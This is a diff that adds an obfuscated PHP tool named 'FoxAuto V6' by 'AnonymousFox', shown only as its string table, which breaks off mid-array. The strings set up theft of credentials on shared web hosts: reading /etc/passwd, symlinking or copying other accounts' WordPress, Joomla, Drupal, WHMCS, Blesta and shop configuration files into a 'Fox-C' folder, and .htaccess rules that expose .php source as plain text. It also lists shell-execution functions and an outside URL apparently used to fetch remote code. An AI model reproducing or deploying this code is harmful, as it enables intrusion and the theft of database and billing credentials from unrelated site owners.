@@ -1,0 +1,693 @@
+<?php
+
+error_reporting("\0\0\17\3\30");
+define('äØ', 'î');
+$GLOBALS[äØ] = array(0 => "<head><title>FoxAuto V6</title></head>\n", 1 => "AnonymousFox", 2 => "ForceType text/plain\r\nAddType text/plain .php\r\nAddType text/plain .html\r\nAddType text/html .shtml\r\nAddType txt .php\r\nAddHandler server-parsed .php\r\nAddHandler txt .php\r\nAddHandler txt .html\r\nAddHandler txt .shtml\r\nOptions All", 3 => "<h1>Config auto grab</h1><div class=content>", 4 => "Fox-CCFS/.htaccess", 5 => "<b>loading...</b><br><br>", 6 => "Fox-CCFS", 7 => "\n", 8 => "\n", 9 => "passwd", 10 => "a", 11 => "passwd", 12 => "passwd", 13 => "/etc/passwd", 14 => "/home/", 15 => "/public_html/support/configuration.php", 16 => "Fox-CCFS/", 17 => "-support-WHMCS.txt", 18 => "/home/", 19 => "/public_html/blog/wp-config.php", 20 => "Fox-CCFS/", 21 => "-wordpress-blog.txt", 22 => "/home/", 23 => "/public_html/web/wp-config.php", 24 => "Fox-CCFS/", 25 => "-wordpress-web.txt", 26 => "/home/", 27 => "/public_html/old/wp-config.php", 28 => "Fox-CCFS/", 29 => "-wordpress-old.txt", 30 => "/home/", 31 => "/public_html/site/configuration.php", 32 => "Fox-CCFS/", 33 => "-joomla-site.txt", 34 => "/home/", 35 => "/public_html/sites/default/settings.php", 36 => "Fox-CCFS/", 37 => "-drupal.txt", 38 => "/home/", 39 => "/public_html/web/configuration.php", 40 => "Fox-CCFS/", 41 => "-joomla-web.txt", 42 => "/home/", 43 => "/public_html/demo/wp-config.php", 44 => "Fox-CCFS/", 45 => "-wordpress-demo.txt", 46 => "/home/", 47 => "/public_html/bb-config.php", 48 => "Fox-CCFS/", 49 => "-BoxBilling.txt", 50 => "/home/", 51 => "/public_html/admin/conf.php", 52 => "Fox-CCFS/", 53 => "-5.txt", 54 => "/home/", 55 => "/public_html/clientarea/configuration.php", 56 => "Fox-CCFS/", 57 => "-clientarea-WHMCS.txt", 58 => "/home/", 59 => "/public_html/clients/configuration.php", 60 => "Fox-CCFS/", 61 => "-clients-WHMCS.txt", 62 => "/home/", 63 => "/public_html/support/includes/iso4217.php", 64 => "Fox-CCFS/", 65 => "-support-Hostbills.txt", 66 => "/home/", 67 => "/public_html/clients/includes/iso4217.php", 68 => "-clients-Hostbills.txt", 69 => "/home/", 70 => "/public_html/zencart/includes/dist-configure.php", 71 => "Fox-CCFS/", 72 => "-zencart-Zencart.txt", 73 => "/home/", 74 => "/public_html/my/configuration.php", 75 => "Fox-CCFS/", 76 => "-my-WHMCS.txt", 77 => "/public_html/new/configuration.php", 78 => "Fox-CCFS/", 79 => "-joomla-new.txt", 80 => "/home/", 81 => "/public_html/billing/config/blesta.php", 82 => "Fox-CCFS/", 83 => "-billing-Blesta.txt", 84 => "/home/", 85 => "/public_html/client/configuration.php", 86 => "Fox-CCFS/", 87 => "-client-WHMCS.txt", 88 => "/home/", 89 => "/public_html/connect.php", 90 => "Fox-CCFS/", 91 => "-8.txt", 92 => "/home/", 93 => "/public_html/wp/wp-config.php", 94 => "Fox-CCFS/", 95 => "-wordpress-wp.txt", 96 => "/home/", 97 => "/public_html/billing/config/blesta.php", 98 => "Fox-CCFS/", 99 => "-billing-Blesta.txt", 100 => "/home/", 101 => "/public_html/client/configuration.php", 102 => "Fox-CCFS/", 103 => "-client-WHMCS.txt", 104 => "/home/", 105 => "/public_html/configuration.php", 106 => "Fox-CCFS/", 107 => "-joomla.txt", 108 => "/public_html/whmcs/configuration.php", 109 => "Fox-CCFS/", 110 => "-whmcs-WHMCS.txt", 111 => "/home/", 112 => "/public_html/member/configuration.php", 113 => "Fox-CCFS/", 114 => "-member-WHMCS.txt", 115 => "/home/", 116 => "/public_html/hostbills/includes/iso4217.php", 117 => "Fox-CCFS/", 118 => "-hostbills-Hostbills.txt", 119 => "/home/", 120 => "/public_html/admin/conf.php", 121 => "Fox-CCFS/", 122 => "-5.txt", 123 => "/public_html/config.php", 124 => "Fox-CCFS/", 125 => "-OpenCart.txt", 126 => "/home/", 127 => "/public_html/config/settings.inc.php", 128 => "Fox-CCFS/", 129 => "-PrestaShop.txt", 130 => "/home/", 131 => "/public_html/wp-config.php", 132 => "Fox-CCFS/", 133 => "-wordpress.txt", 134 => "/public_html/test/configuration.php", 135 => "Fox-CCFS/", 136 => "-joomla-test.txt", 137 => "/home/", 138 => "/public_html/drupal/sites/default/settings.php", 139 => "Fox-CCFS/", 140 => "-drupal2.txt", 141 => "/home/", 142 => "/public_html/config/blesta.php", 143 => "Fox-CCFS/", 144 => "-Blesta.txt", 145 => "/public_html/joomla/configuration.php", 146 => "Fox-CCFS/", 147 => "-joomla-joomla.txt", 148 => "/home/", 149 => "/public_html/include/config.php", 150 => "Fox-CCFS/", 151 => "-10.txt", 152 => "/home/", 153 => "/public_html/includes/config.php", 154 => "Fox-CCFS/", 155 => "-vb2.txt", 156 => "/public_html/demo/configuration.php", 157 => "Fox-CCFS/", 158 => "-joomla-demo.txt", 159 => "/home/", 160 => "/public_html/config.php", 161 => "Fox-CCFS/", 162 => "-OpenCart.txt", 163 => "/home/", 164 => "/public_html/joomla/configuration.php", 165 => "Fox-CCFS/", 166 => "-joomla-joomla.txt", 167 => "/public_html/whmcs/configuration.php", 168 => "Fox-CCFS/", 169 => "-whmcs-WHMCS.txt", 170 => "/public_html/include/config.php", 171 => "Fox-CCFS/", 172 => "-10.txt", 173 => "/home/", 174 => "/public_html/support/bb-config.php", 175 => "Fox-CCFS/", 176 => "-support-BoxBilling.txt", 177 => "/public_html/blog/wp-config.php", 178 => "Fox-CCFS/", 179 => "-wordpress-blog.txt", 180 => "/home/", 181 => "/public_html/demo/wp-config.php", 182 => "Fox-CCFS/", 183 => "-wordpress-demo.txt", 184 => "/home/", 185 => "/public_html/test/configuration.php", 186 => "Fox-CCFS/", 187 => "-joomla-test.txt", 188 => "/home/", 189 => "/public_html/mk_conf.php", 190 => "-9.txt", 191 => "/home/", 192 => "/public_html/mk_conf.php", 193 => "Fox-CCFS/", 194 => "-9.txt", 195 => "/public_html/blogs/wp-config.php", 196 => "Fox-CCFS/", 197 => "-wordpress-blogs.txt", 198 => "/public_html/site/wp-config.php", 199 => "Fox-CCFS/", 200 => "-wordpress-site.txt", 201 => "/home/", 202 => "/public_html/includes/iso4217.php", 203 => "-Hostbills.txt", 204 => "/public_html/includes/iso4217.php", 205 => "-Hostbills.txt", 206 => "/public_html/support/bb-config.php", 207 => "Fox-CCFS/", 208 => "-support-BoxBilling.txt", 209 => "/home/", 210 => "/public_html/blesta/config/blesta.php", 211 => "Fox-CCFS/", 212 => "-blesta-Blesta.txt", 213 => "/home/", 214 => "/public_html/appuser/functions.php", 215 => "Fox-CCFS/", 216 => "-tr.txt", 217 => "/public_html/portal/wp-config.php", 218 => "Fox-CCFS/", 219 => "-wordpress-portal.txt", 220 => "/public_html/zencart/includes/dist-configure.php", 221 => "Fox-CCFS/", 222 => "-zencart-Zencart.txt", 223 => "/home/", 224 => "/public_html/wp-config.php", 225 => "Fox-CCFS/", 226 => "-wordpress.txt", 227 => "/public_html/sites/default/settings.php", 228 => "Fox-CCFS/", 229 => "-drupal.txt", 230 => "/home/", 231 => "/public_html/hostbills/includes/iso4217.php", 232 => "Fox-CCFS/", 233 => "-hostbills-Hostbills.txt", 234 => "/public_html/demo/configuration.php", 235 => "Fox-CCFS/", 236 => "-joomla-demo.txt", 237 => "/public_html/clients/bb-config.php", 238 => "Fox-CCFS/", 239 => "-clients-BoxBilling.txt", 240 => "/home/", 241 => "/public_html/bb-config.php", 242 => "Fox-CCFS/", 243 => "-BoxBilling.txt", 244 => "/public_html/web/configuration.php", 245 => "Fox-CCFS/", 246 => "-joomla-web.txt", 247 => "/public_html/boxbilling/bb-config.php", 248 => "Fox-CCFS/", 249 => "-boxbilling-BoxBilling.txt", 250 => "/public_html/billing/includes/iso4217.php", 251 => "Fox-CCFS/", 252 => "-billing-Hostbills.txt", 253 => "/public_html/billing/bb-config.php", 254 => "Fox-CCFS/", 255 => "-billing-BoxBilling.txt", 256 => "/home/", 257 => "/public_html/includes/dist-configure.php", 258 => "Fox-CCFS/", 259 => "-Zencart.txt", 260 => "/public_html/new/configuration.php", 261 => "Fox-CCFS/", 262 => "-joomla-new.txt", 263 => "/public_html/portal/configuration.php", 264 => "Fox-CCFS/", 265 => "-joomla-portal.txt", 266 => "/public_html/includes/config.php", 267 => "-vb2.txt", 268 => "/public_html/billing/configuration.php", 269 => "Fox-CCFS/", 270 => "-billing-WHMCS.txt", 271 => "/public_html/new/wp-config.php", 272 => "Fox-CCFS/", 273 => "-wordpress-new.txt", 274 => "/home/", 275 => "/public_html/billing/includes/iso4217.php", 276 => "-billing-Hostbills.txt", 277 => "/public_html/portal/wp-config.php", 278 => "Fox-CCFS/", 279 => "-wordpress-portal.txt", 280 => "/home/", 281 => "/public_html/appuser/functions.php", 282 => "Fox-CCFS/", 283 => "-tr.txt", 284 => "/public_html/clients/configuration.php", 285 => "Fox-CCFS/", 286 => "-clients-WHMCS.txt", 287 => "/home/", 288 => "/public_html/old/configuration.php", 289 => "Fox-CCFS/", 290 => "-joomla-old.txt", 291 => "/public_html/billing/bb-config.php", 292 => "Fox-CCFS/", 293 => "-billing-BoxBilling.txt", 294 => "/public_html/conf_global.php", 295 => "Fox-CCFS/", 296 => "-6.txt", 297 => "/public_html/old/configuration.php", 298 => "Fox-CCFS/", 299 => "-joomla-old.txt", 300 => "/public_html/forums/includes/config.php", 301 => "Fox-CCFS/", 302 => "-forums.txt", 303 => "/public_html/old/wp-config.php", 304 => "Fox-CCFS/", 305 => "-wordpress-old.txt", 306 => "/public_html/includes/dist-configure.php", 307 => "-Zencart.txt", 308 => "/public_html/clients/config/blesta.php", 309 => "-clients-Blesta.txt", 310 => "/public_html/blesta/config/blesta.php", 311 => "Fox-CCFS/", 312 => "-blesta-Blesta.txt", 313 => "/public_html/clients/includes/iso4217.php", 314 => "Fox-CCFS/", 315 => "-clients-Hostbills.txt", 316 => ":", 317 => "/public_html/forum/includes/config.php", 318 => "Fox-CCFS/", 319 => "-forum.txt", 320 => "/home/", 321 => "/public_html/billing/configuration.php", 322 => "Fox-CCFS/", 323 => "-billing-WHMCS.txt", 324 => "/public_html/support/config/blesta.php", 325 => "Fox-CCFS/", 326 => "-support-Blesta.txt", 327 => "/public_html/conf_global.php", 328 => "-6.txt", 329 => "/public_html/site/wp-config.php", 330 => "Fox-CCFS/", 331 => "-wordpress-site.txt", 332 => "/public_html/blogs/wp-config.php", 333 => "Fox-CCFS/", 334 => "-wordpress-blogs.txt", 335 => "/public_html/beta/wp-config.php", 336 => "-wordpress-beta.txt", 337 => "/home/", 338 => "/public_html/support/includes/iso4217.php", 339 => "Fox-CCFS/", 340 => "-support-Hostbills.txt", 341 => "/public_html/vb/includes/config.php", 342 => "Fox-CCFS/", 343 => "-vb.txt", 344 => "/public_html/site/configuration.php", 345 => "Fox-CCFS/", 346 => "-joomla-site.txt", 347 => "/home/", 348 => "/public_html/new/wp-config.php", 349 => "Fox-CCFS/", 350 => "-wordpress-new.txt", 351 => "/public_html/support/configuration.php", 352 => "-support-WHMCS.txt", 353 => "/public_html/clients/config/blesta.php", 354 => "Fox-CCFS/", 355 => "-clients-Blesta.txt", 356 => "/public_html/test/wp-config.php", 357 => "Fox-CCFS/", 358 => "-wordpress-test.txt", 359 => "/public_html/beta/wp-config.php", 360 => "Fox-CCFS/", 361 => "-wordpress-beta.txt", 362 => "/public_html/member/configuration.php", 363 => "Fox-CCFS/", 364 => "-member-WHMCS.txt", 365 => "/home/", 366 => "/public_html/clients/bb-config.php", 367 => "Fox-CCFS/", 368 => "-clients-BoxBilling.txt", 369 => "/public_html/web/wp-config.php", 370 => "-wordpress-web.txt", 371 => "/public_html/config/blesta.php", 372 => "Fox-CCFS/", 373 => "-Blesta.txt", 374 => "/public_html/drupal/sites/default/settings.php", 375 => "Fox-CCFS/", 376 => "-drupal2.txt", 377 => "/public_html/my/configuration.php", 378 => "Fox-CCFS/", 379 => "-my-WHMCS.txt", 380 => "/public_html/forum/includes/config.php", 381 => "Fox-CCFS/", 382 => "-forum.txt", 383 => "/public_html/configuration.php", 384 => "Fox-CCFS/", 385 => "-joomla.txt", 386 => "/home/", 387 => "/public_html/wordpress/wp-config.php", 388 => "Fox-CCFS/", 389 => "-wordpress-wordpress.txt", 390 => "/home/", 391 => "/public_html/connect.php", 392 => "-8.txt", 393 => "/public_html/support/config/blesta.php", 394 => "Fox-CCFS/", 395 => "-support-Blesta.txt", 396 => "/public_html/forums/includes/config.php", 397 => "Fox-CCFS/", 398 => "-forums.txt", 399 => "/home/", 400 => "/public_html/portal/configuration.php", 401 => "Fox-CCFS/", 402 => "-joomla-portal.txt", 403 => "/public_html/clientarea/configuration.php", 404 => "-clientarea-WHMCS.txt", 405 => "/public_html/wordpress/wp-config.php", 406 => "Fox-CCFS/", 407 => "-wordpress-wordpress.txt", 408 => "/public_html/vb/includes/config.php", 409 => "Fox-CCFS/", 410 => "-vb.txt", 411 => "/public_html/test/wp-config.php", 412 => "Fox-CCFS/", 413 => "-wordpress-test.txt", 414 => "/public_html/boxbilling/bb-config.php", 415 => "Fox-CCFS/", 416 => "-boxbilling-BoxBilling.txt", 417 => "/public_html/include/db.php", 418 => "Fox-CCFS/", 419 => "-7.txt", 420 => "/public_html/config/settings.inc.php", 421 => "Fox-CCFS/", 422 => "-PrestaShop.txt", 423 => "/home/", 424 => "/public_html/include/db.php", 425 => "Fox-CCFS/", 426 => "-7.txt", 427 => "/public_html/wp/wp-config.php", 428 => "Fox-CCFS/", 429 => "-wordpress-wp.txt", 430 => "file", 431 => "name", 432 => "file", 433 => "tmp_name", 434 => "display_errors", 435 => "http", 436 => "<?php", 437 => "", 438 => "<?php", 439 => "?>", 440 => "config", 441 => "error_log", 442 => "upload", 443 => "config404", 444 => "HTTP_HOST", 445 => "REQUEST_URI", 446 => "http://tecnogv.com.mx/googleapis/fonts.css", 447 => "AnonymousFox", 448 => "/", 449 => "Fox-C404/root", 450 => "Fox-C404", 451 => "<center>\r\n\t<a href=\"Fox-C404/root/\">Root</a>\r\n\t<br><a href=\"Fox-C404/\">Configurations</a></center>", 452 => "Fox-C404/.htaccess", 453 => "/etc/passwd", 454 => ":", 455 => "WHM-accesshash", 456 => "Lokomedia", 457 => "phpBB", 458 => "Drupal", 459 => "PrestaShop", 460 => "Magento", 461 => "OpenCart", 462 => "Ellislab", 463 => "Vbulletin", 464 => "Vbulletin", 465 => "Vbulletin", 466 => "MyBB", 467 => "OsCommerce", 468 => "IPB", 469 => "Wordpress", 470 => "Wordpress-test", 471 => "Wordpress-blog", 472 => "Wordpress-beta", 473 => "Wordpress-portal", 474 => "Wordpress-site", 475 => "Wordpress-wp", 476 => "Wordpress-WPc", 477 => "Wordpress-new", 478 => "Wordpress-wordpress", 479 => "Wordpress-demo", 480 => "Wordpress-home", 481 => "Wordpress-old", 482 => "Wordpress-blogs", 483 => "Joomla", 484 => "Joomla-blog", 485 => "Joomla-cms", 486 => "Joomla-beta", 487 => "Joomla-portal", 488 => "Joomla-site", 489 => "Joomla-main", 490 => "Joomla-home", 491 => "Joomla-demo", 492 => "Joomla-test", 493 => "Joomla-joomla", 494 => "Joomla-new", 495 => "Joomla-old", 496 => "WHMCScc-WHMCS", 497 => "whmcs-WHMCS", 498 => "accounts-WHMCS", 499 => "WHMcccc-WHMCS", 500 => "whm-WHMCS", 501 => "host-WHMCS", 502 => "supportes-WHMCS", 503 => "domains-WHMCS", 504 => "domain-WHMCS", 505 => "hosting-WHMCS", 506 => "cart-WHMCS", 507 => "order-WHMCS", 508 => "client-WHMCS", 509 => "clientarea-WHMCS", 510 => "support-WHMCS", 511 => "billing-WHMCS", 512 => "buy-WHMCS", 513 => "manage-WHMCS", 514 => "clientsupport-WHMCS", 515 => "checkout-WHMCS", 516 => "billings-WHMCS", 517 => "basket-WHMCS", 518 => "secure-WHMCS", 519 => "sales-WHMCS", 520 => "bill-WHMCS", 521 => "purchase-WHMCS", 522 => "account-WHMCS", 523 => "user-WHMCS", 524 => "clients-WHMCS", 525 => "my-WHMCS", 526 => "secure-whm-WHMCS", 527 => "secure-whmcs-WHMCS", 528 => "panel-WHMCS", 529 => "clientes-WHMCS", 530 => "cliente-WHMCS", 531 => "support-order-WHMCS", 532 => "BoxBilling", 533 => "boxbilling-BoxBilling", 534 => "support-BoxBilling", 535 => "clients-BoxBilling", 536 => "billing-BoxBilling", 537 => "Blesta", 538 => "blesta-Blesta", 539 => "support-Blesta", 540 => "clients-Blesta", 541 => "billing-Blesta", 542 => "Zencart", 543 => "zencart-Zencart", 544 => "Hostbills", 545 => "hostbills-Hostbills", 546 => "support-Hostbills", 547 => "clients-Hostbills", 548 => "billing-Hostbills", 549 => "Fox-C404/", 550 => "-", 551 => ".txt404", 552 => "Fox-C404/", 553 => "-", 554 => ".txt404/.htaccess", 555 => "Fox-C404/", 556 => ".txt404/fox.txt", 557 => "Options Indexes FollowSymLinks\r\nDirectoryIndex foxnoindex.html\r\nHeaderName fox.txt\r\nSatisfy Any\r\nIndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble\r\nIndexIgnore *", 558 => "Fox-C404/", 559 => ".txt", 560 => "Options Indexes FollowSymLinks\r\nDirectoryIndex foxnoindex.htm\r\nAddType text/plain .php \r\nAddHandler text/plain .php\r\nSatisfy Any\r\nIndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*\r\nIndexIgnore *.txt404\r\nRewriteEngine On\r\nRewriteCond %{REQUEST_FILENAME} ^.*Fox-C404 [NC]\r\nRewriteRule \\.txt\$ %{REQUEST_URI}404 [L,R=302.NC]", 561 => "configCFS", 562 => "log_errors", 563 => "http://", 564 => "php", 565 => "exec", 566 => "passthru", 567 => "system", 568 => "shell_exec", 569 => "r", 570 => "AnonymousFox", 571 => "/vhosts/", 572 => "/etc/passwd", 573 => "ln -s ", 574 => "/httpdocs/test/wp-config.php Fox-C/", 575 => "-wordpress-test.txt", 576 => "ln -s ", 577 => "/httpdocs/demo/configuration.php Fox-C/", 578 => "-joomla-demo.txt", 579 => "/httpdocs/configuration.php Fox-C/", 580 => "-joomla.txt", 581 => "ln -s ", 582 => "/httpdocs/old/wp-config.php Fox-C/", 583 => "-wordpress-old.txt", 584 => "ln -s ", 585 => "/httpdocs/wp/wp-config.php Fox-C/", 586 => "-wordpress-wp.txt", 587 => "ln -s ", 588 => "/httpdocs/new/configuration.php Fox-C/", 589 => "-joomla-new.txt", 590 => "ln -s ", 591 => "/httpdocs/opencart/config.php Fox-C/", 592 => "-opencart-opencart.txt", 593 => "ln -s ", 594 => "/httpdocs/wordpress/wp-config.php Fox-C/", 595 => "-wordpress-wordpress.txt", 596 => "ln -s ", 597 => "/httpdocs/web/wp-config.php Fox-C/", 598 => "-wordpress-web.txt", 599 => "ln -s ", 600 => "/httpdocs/sites/default/settings.php Fox-C/", 601 => "-drupal.txt", 602 => "ln -s ", 603 => "/httpdocs/beta/wp-config.php Fox-C/", 604 => "-wordpress-beta.txt", 605 => "cp ", 606 => "/httpdocs/configuration.php Fox-C/", 607 => "-joomla.txt", 608 => "ln -s ", 609 => "/httpdocs/demo/wp-config.php Fox-C/", 610 => "-wordpress-demo.txt", 611 => "ln -s ", 612 => "/httpdocs/config.php Fox-C/", 613 => "-opencart.txt", 614 => "ln -s ", 615 => "/httpdocs/old/configuration.php Fox-C/", 616 => "-joomla-old.txt", 617 => "ln -s ", 618 => "/httpdocs/portal/configuration.php Fox-C/", 619 => "-joomla-portal.txt", 620 => "ln -s ", 621 => "/httpdocs/blog/wp-config.php Fox-C/", 622 => "-wordpress-blog.txt", 623 => "cp ", 624 => "/httpdocs/wp-config.php Fox-C/", 625 => "-wordpress.txt", 626 => "ln -s ", 627 => "/httpdocs/new/wp-config.php Fox-C/", 628 => "-wordpress-new.txt", 629 => "ln -s ", 630 => "/httpdocs/wp-config.php Fox-C/", 631 => "-wordpress.txt", 632 => "/httpdocs/site/configuration.php Fox-C/", 633 => "-joomla-site.txt", 634 => "/httpdocs/test/configuration.php Fox-C/", 635 => "-joomla-test.txt", 636 => "ln -s ", 637 => "/httpdocs/joomla/configuration.php Fox-C/", 638 => "-joomla-joomla.txt", 639 => "/httpdocs/site/wp-config.php Fox-C/", 640 => "-wordpress-site.txt", 641 => "ln -s ", 642 => "/httpdocs/drupal/sites/default/settings.php Fox-C/", 643 => "-drupal2.txt", 644 => "ln -s ", 645 => "/httpdocs/web/configuration.php Fox-C/", 646 => "-joomla-web.txt", 647 => "<h1>Config Vhost</h1><div class=content>", 648 => "/etc/passwd", 649 => "Fox-C/.htaccess", 650 => "<b>loading...</b><br><br>", 651 => "Fox-C", 652 => "cp ", 653 => "/httpdocs/configuration.php Fox-C/", 654 => "-joomla.txt", 655 => "/httpdocs/new/configuration.php Fox-C/", 656 => "-joomla-new.txt", 657 => "ln -s ", 658 => "/httpdocs/demo/wp-config.php Fox-C/", 659 => "-wordpress-demo.txt", 660 => "/httpdocs/drupal/sites/default/settings.php Fox-C/", 661 => "-drupal2.txt", 662 => "ln -s ", 663 => "/httpdocs/new/wp-config.php Fox-C/", 664 => "-wordpress-new.txt", 665 => "/httpdocs/old/configuration.php Fox-C/", 666 => "-joomla-old.txt", 667 => "/httpdocs/demo/configuration.php Fox-C/", 668 => "-joomla-demo.txt", 669 => "ln -s ", 670 => "/httpdocs/opencart/config.php Fox-C/", 671 => "-opencart-opencart.txt", 672 => "ln -s ", 673 => "/httpdocs/test/wp-config.php Fox-C/", 674 => "-wordpress-test.txt", 675 => "ln -s ", 676 => "/httpdocs/portal/configuration.php Fox-C/", 677 => "-joomla-portal.txt", 678 => "/httpdocs/configuration.php Fox-C/", 679 => "-joomla.txt", 680 => "cp ", 681 => "/httpdocs/wp-config.php Fox-C/", 682 => "-wordpress.txt", 683 => "ln -s ", 684 => "/httpdocs/site/configuration.php Fox-C/", 685 => "-joomla-site.txt", 686 => "cp ", 687 => "/httpdocs/opencart/config.php Fox-C/", 688 => "opencart-opencart.txt", 689 => "/httpdocs/web/wp-config.php Fox-C/", 690 => "-wordpress-web.txt", 691 => "ln -s ", 692 => "/httpdocs/wp/wp-config.php Fox-C/", 693 => "-wordpress-wp.txt", 694 => "ln -s ", 695 => "/httpdocs/joomla/configuration.php Fox-C/", 696 => "-joomla-joomla.txt", 697 => "/httpdocs/sites/default/settings.php Fox-C/", 698 => "-drupal.txt", 699 => "/httpdocs/old/wp-config.php Fox-C/", 700 => "-wordpress-old.txt", 701 => "ln -s ", 702 => "/httpdocs/beta/wp-config.php Fox-C/", 703 => "-wordpress-beta.txt", 704 => "ln -s ", 705 => "/httpdocs/test/configuration.php Fox-C/", 706 => "-joomla-test.txt", 707 => "/httpdocs/site/wp-config.php Fox-C/", 708 => "-wordpress-site.txt", 709 => "ln -s ", 710 => "/httpdocs/wordpress/wp-config.php Fox-C/", 711 => "-wordpress-wordpress.txt", 712 => "ln -s ", 713 => "/httpdocs/config.php Fox-C/", 714 => "-opencart.txt", 715 => "ln -s ", 716 => "/httpdocs/wp-config.php Fox-C/", 717 => "-wordpress.txt", 718 => "ln -s ", 719 => "/httpdocs/web/configuration.php Fox-C/", 720 => "-joomla-web.txt", 721 => "/httpdocs/blog/wp-config.php Fox-C/", 722 => "-wordpress-blog.txt", 723 => "<b>loading...</b><br><br>", 724 => "Fox-C/.htaccess", 725 => "<h1>Config Vhost</h1><div class=content>", 726 => "cat /etc/passwd > passwd", 727 => "passwd", 728 => "Fox-C", 729 => "<b>Done! -> ", 730 => "/Fox-C/</b><br><br></td></table>", 731 => "/virtual/", 732 => "/etc/passwd", 733 => "/htdocs/sites/default/settings.php Fox-C/", 734 => "-drupal.txt", 735 => "ln -s ", 736 => "/htdocs/blog/wp-config.php Fox-C/", 737 => "-wordpress-blog.txt", 738 => "ln -s ", 739 => "/htdocs/new/wp-config.php Fox-C/", 740 => "-wordpress-new.txt", 741 => "ln -s ", 742 => "/htdocs/wp-config.php Fox-C/", 743 => "-wordpress.txt", 744 => "ln -s ", 745 => "/htdocs/drupal/sites/default/settings.php Fox-C/", 746 => "-drupal2.txt", 747 => "/htdocs/configuration.php Fox-C/", 748 => "-joomla.txt", 749 => "/htdocs/demo/configuration.php Fox-C/", 750 => "-joomla-demo.txt", 751 => "/htdocs/old/configuration.php Fox-C/", 752 => "-joomla-old.txt", 753 => "/htdocs/beta/wp-config.php Fox-C/", 754 => "-wordpress-beta.txt", 755 => "/htdocs/old/wp-config.php Fox-C/", 756 => "-wordpress-old.txt", 757 => "ln -s ", 758 => "/htdocs/site/wp-config.php Fox-C/", 759 => "-wordpress-site.txt", 760 => "/htdocs/configuration.php Fox-C/", 761 => "-joomla.txt", 762 => "/htdocs/joomla/configuration.php Fox-C/", 763 => "-joomla-joomla.txt", 764 => "/htdocs/demo/wp-config.php Fox-C/", 765 => "-wordpress-demo.txt", 766 => "/htdocs/opencart/config.php Fox-C/", 767 => "-opencart-opencart.txt", 768 => "/htdocs/wp-config.php Fox-C/", 769 => "-wordpress.txt", 770 => "ln -s ", 771 => "/htdocs/wordpress/wp-config.php Fox-C/", 772 => "-wordpress-wordpress.txt", 773 => "/htdocs/new/configuration.php Fox-C/", 774 => "-joomla-new.txt", 775 => "/htdocs/test/configuration.php Fox-C/", 776 => "-joomla-test.txt", 777 => "/htdocs/site/configuration.php Fox-C/", 778 => "-joomla-site.txt", 779 => "/htdocs/web/wp-config.php Fox-C/", 780 => "-wordpress-web.txt", 781 => "/htdocs/test/wp-config.php Fox-C/", 782 => "-wordpress-test.txt", 783 => "/htdocs/portal/configuration.php Fox-C/", 784 => "-joomla-portal.txt", 785 => "ln -s ", 786 => "/htdocs/config.php Fox-C/", 787 => "-opencart.txt", 788 => "ln -s ", 789 => "/htdocs/web/configuration.php Fox-C/", 790 => "-joomla-web.txt", 791 => "/htdocs/wp/wp-config.php Fox-C/", 792 => "-wordpress-wp.txt", 793 => "<b>loading...</b><br><br>", 794 => "/etc/passwd", 795 => "Fox-C/.htaccess", 796 => "<h1>Config Vhost</h1><div class=content>", 797 => "Fox-C", 798 => "Fox-C", 799 => "<b>loading...</b><br><br>", 800 => "<h1>Config Vhost</h1><div class=content>", 801 => "cat /etc/passwd > passwd", 802 => "Fox-C/.htaccess", 803 => "/htdocs/wordpress/wp-config.php Fox-C/", 804 => "-wordpress-wordpress.txt", 805 => "/htdocs/demo/wp-config.php Fox-C/", 806 => "-wordpress-demo.txt", 807 => "/htdocs/portal/configuration.php Fox-C/", 808 => "-joomla-portal.txt", 809 => "/htdocs/site/configuration.php Fox-C/", 810 => "-joomla-site.txt", 811 => "ln -s ", 812 => "/htdocs/sites/default/settings.php Fox-C/", 813 => "-drupal.txt", 814 => "/htdocs/old/wp-config.php Fox-C/", 815 => "-wordpress-old.txt", 816 => "/htdocs/joomla/configuration.php Fox-C/", 817 => "-joomla-joomla.txt", 818 => "/htdocs/configuration.php Fox-C/", 819 => "-joomla.txt", 820 => "/htdocs/new/configuration.php Fox-C/", 821 => "-joomla-new.txt", 822 => "ln -s ", 823 => "/htdocs/opencart/config.php Fox-C/", 824 => "-opencart-opencart.txt", 825 => "/htdocs/old/configuration.php Fox-C/", 826 => "-joomla-old.txt", 827 => "/htdocs/test/configuration.php Fox-C/", 828 => "-joomla-test.txt", 829 => "/htdocs/web/configuration.php Fox-C/", 830 => "-joomla-web.txt", 831 => "/htdocs/wp-config.php Fox-C/", 832 => "-wordpress.txt", 833 => "cp ", 834 => "/htdocs/wp-config.php Fox-C/", 835 => "-wordpress.txt", 836 => "/htdocs/beta/wp-config.php Fox-C/", 837 => "-wordpress-beta.txt", 838 => "/htdocs/opencart/config.php Fox-C/", 839 => "opencart-opencart.txt", 840 => "/htdocs/test/wp-config.php Fox-C/", 841 => "-wordpress-test.txt", 842 => "ln -s ", 843 => "/htdocs/blog/wp-config.php Fox-C/", 844 => "-wordpress-blog.txt", 845 => "ln -s ", 846 => "/htdocs/configuration.php Fox-C/", 847 => "-joomla.txt", 848 => "/htdocs/drupal/sites/default/settings.php Fox-C/", 849 => "-drupal2.txt", 850 => "/htdocs/new/wp-config.php Fox-C/", 851 => "-wordpress-new.txt", 852 => "/htdocs/demo/configuration.php Fox-C/", 853 => "-joomla-demo.txt", 854 => "ln -s ", 855 => "/htdocs/web/wp-config.php Fox-C/", 856 => "-wordpress-web.txt", 857 => "ln -s ", 858 => "/htdocs/site/wp-config.php Fox-C/", 859 => "-wordpress-site.txt", 860 => "/htdocs/wp/wp-config.php Fox-C/", 861 => "-wordpress-wp.txt", 862 => "/htdocs/config.php Fox-C/", 863 => "-opencart.txt", 864 => "<b>Done! -> ", 865 => "/Fox-C/</b><br><br></td></table>", 866 => "/clients\\/client/", 867 => "/etc/passwd", 868 => "ln -s ", 869 => "/web/new/configuration.php Fox-C/", 870 => "-joomla-new.txt", 871 => "/web/sites/default/settings.php Fox-C/", 872 => "-drupal.txt", 873 => "ln -s ", 874 => "/web/site/wp-config.php Fox-C/", 875 => "-wordpress-site.txt", 876 => "/web/wp-config.php Fox-C/", 877 => "-wordpress.txt", 878 => "/web/beta/wp-config.php Fox-C/", 879 => "-wordpress-beta.txt", 880 => "/web/old/configuration.php Fox-C/", 881 => "-joomla-old.txt", 882 => "/web/site/configuration.php Fox-C/", 883 => "-joomla-site.txt", 884 => "/web/web/wp-config.php Fox-C/", 885 => "-wordpress-web.txt", 886 => "/web/joomla/configuration.php Fox-C/", 887 => "-joomla-joomla.txt", 888 